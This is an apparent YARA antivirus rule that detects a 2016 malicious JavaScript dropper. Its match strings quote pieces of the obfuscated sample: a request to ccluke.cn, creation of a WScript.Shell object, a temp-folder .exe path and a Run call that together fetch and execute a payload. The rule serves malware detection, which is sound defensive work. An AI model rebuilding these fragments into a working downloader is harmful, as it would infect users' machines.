rule sig_20160330_e842f952f277d93d557f6548832213b6 {
  meta:
    description = "datamaliciousorder - file 20160330_e842f952f277d93d557f6548832213b6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3efb6d73d2f9236a79ce96533ece6c77a6322ce4a47ce847b404ef1e70212bb4"

  strings:
    $s1  = "_XC[_H](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s2  = "function _T(_EZ, _IC){_LK = _LK * 1; return _EZ - _IC;};" fullword ascii
    $s3  = "var _ZN = function _KZ() {return WScript[_BE](\"WScript\"+\".Shell\");}(), _OJ = 11;" fullword ascii
    $s4  = "if (_XC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _U() {return _ZN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ZNGoDR8pKlJESKAY.ex\" + \"e\";};" fullword ascii
    $s6  = "function _LD(){return _A + \"\";};" fullword ascii
    $s7  = "function _N() {return ((_KX == true) && (_KX == _T0)) ? 1 : _LK;};" fullword ascii
    $s8  = "function _ZZ(_IR){_ZN[\"Run\"](_IR, _LK, _LK);};" fullword ascii
    $s9  = "function _G(){return 22;};" fullword ascii
    $s10 = "var _TF = new this[\"Date\"]();" fullword ascii
    $s11 = "function _TX()" fullword ascii
    $s12 = "function _I(_Q) {var _DE = (1, 2, 3, 4, 5, _Q); return _DE;};" fullword ascii
    $s13 = "function _YW(){return _BE;};" fullword ascii
    $s14 = " while (_QQ){" fullword ascii
    $s15 = "return _T(_Q1, _MR);" fullword ascii
    $s16 = "var _T0 = false;" fullword ascii
    $s17 = "_T0 = true; " fullword ascii
    $s18 = "var _EA = false;" fullword ascii
    $s19 = "var _KX = false;" fullword ascii
    $s20 = "_KX = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}